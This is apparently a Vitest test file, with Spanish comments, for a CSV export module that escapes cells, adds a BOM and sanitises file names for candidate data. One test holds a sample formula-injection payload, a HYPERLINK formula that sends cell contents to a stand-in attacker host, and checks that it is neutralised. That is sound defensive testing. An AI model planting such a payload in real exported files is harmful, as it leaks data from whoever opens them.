import { describe, expect, it } from "vitest";
import { escapeCell, toCsv, exportFileName, type Column } from "./export";

describe("escapeCell", () => {
  it("deja en paz un valor normal", () => {
    expect(escapeCell("Ana Pérez")).toBe("Ana Pérez");
  });

  it("entrecomilla si contiene el separador", () => {
    // Con punto y coma dentro, sin comillas el valor se partiría en dos
    // columnas y toda la fila quedaría descuadrada.
    expect(escapeCell("Madrid; España")).toBe('"Madrid; España"');
  });

  it("duplica las comillas de dentro", () => {
    expect(escapeCell('Le dicen "Nacho"')).toBe('"Le dicen ""Nacho"""');
  });

  it("entrecomilla los saltos de línea (una nota de varias líneas)", () => {
    expect(escapeCell("Punto 1\nPunto 2")).toBe('"Punto 1\nPunto 2"');
  });

  it("convierte null y undefined en celda vacía, no en la palabra 'null'", () => {
    expect(escapeCell(null)).toBe("");
    expect(escapeCell(undefined)).toBe("");
  });

  it("el cero se exporta como 0, no como celda vacía", () => {
    // `0` es falsy: con una comprobación descuidada, un candidato con 0 años de
    // experiencia exportaría un hueco, que se lee como "no se sabe".
    expect(escapeCell(0)).toBe("0");
  });
});

// Un CV lo escribe alguien de fuera de la empresa y llega por correo: es
// contenido NO confiable. Excel ejecuta como fórmula cualquier celda que
// empiece por = + - @, así que hay que desactivarlas.
describe("escapeCell: inyección de fórmulas", () => {
  it("neutraliza una celda que empieza por =", () => {
    expect(escapeCell("=1+1")).toBe("'=1+1");
  });

  it("neutraliza los otros arranques peligrosos (+, -, @)", () => {
    expect(escapeCell("+34600111222")).toBe("'+34600111222");
    expect(escapeCell("-5")).toBe("'-5");
    expect(escapeCell("@usuario")).toBe("'@usuario");
  });

  it("neutraliza un ataque real de exfiltración", () => {
    const ataque = '=HYPERLINK("http://malo.com?d="&A1,"Pincha aquí")';
    const salida = escapeCell(ataque);
    // Ojo: esta celda lleva comillas dentro, así que ADEMÁS se entrecomilla
    // entera. Es decir, no empieza por `'` sino por `"'`. Las dos protecciones
    // se aplican y en este orden: primero neutralizar, luego escapar.
    expect(salida.startsWith("\"'=")).toBe(true);
    expect(salida).toContain("'=HYPERLINK");
  });

  it("no toca un texto que solo CONTIENE = sin empezar por él", () => {
    expect(escapeCell("nivel = alto")).toBe("nivel = alto");
  });
});

interface Row {
  name: string;
  years: number | null;
}
const columns: Column<Row>[] = [
  { header: "Nombre", value: (r) => r.name },
  { header: "Años", value: (r) => r.years },
];

describe("toCsv", () => {
  it("empieza por la marca UTF-8 (BOM) para que Excel no rompa los acentos", () => {
    // Sin esto, "Ramírez" se abre como "RamÃ­rez" en Excel de Windows.
    expect(toCsv([], columns).charCodeAt(0)).toBe(0xfeff);
  });

  it("usa punto y coma, que es lo que espera Excel en español", () => {
    const csv = toCsv([{ name: "Ana", years: 4 }], columns);
    expect(csv).toContain("Nombre;Años");
    expect(csv).toContain("Ana;4");
  });

  it("pone la cabecera aunque no haya ni una fila", () => {
    // Un fichero vacío del todo parece un fallo de la exportación.
    expect(toCsv([], columns)).toBe("﻿Nombre;Años\r\n");
  });

  it("separa las filas con salto de Windows", () => {
    const csv = toCsv(
      [
        { name: "Ana", years: 4 },
        { name: "Bruno", years: null },
      ],
      columns,
    );
    expect(csv.split("\r\n").slice(0, 3)).toEqual(["﻿Nombre;Años", "Ana;4", "Bruno;"]);
  });
});

describe("exportFileName", () => {
  it("termina en .csv y lleva la fecha", () => {
    const name = exportFileName("candidatos");
    expect(name).toMatch(/^candidatos_\d{4}-\d{2}-\d{2}_\d{4}\.csv$/);
  });

  it("quita los caracteres que Windows no admite en un nombre", () => {
    // El título de una oferta lo escribe el usuario: puede llevar / o :
    const name = exportFileName('Mozo/almacén: turno "tarde"');
    expect(name).not.toMatch(/[\\/:*?"<>|]/);
    expect(name).toContain("Mozo-almacén- turno -tarde-");
  });

  it("no se queda sin nombre si el título era solo símbolos", () => {
    expect(exportFileName("///")).toMatch(/^---_/);
  });
});
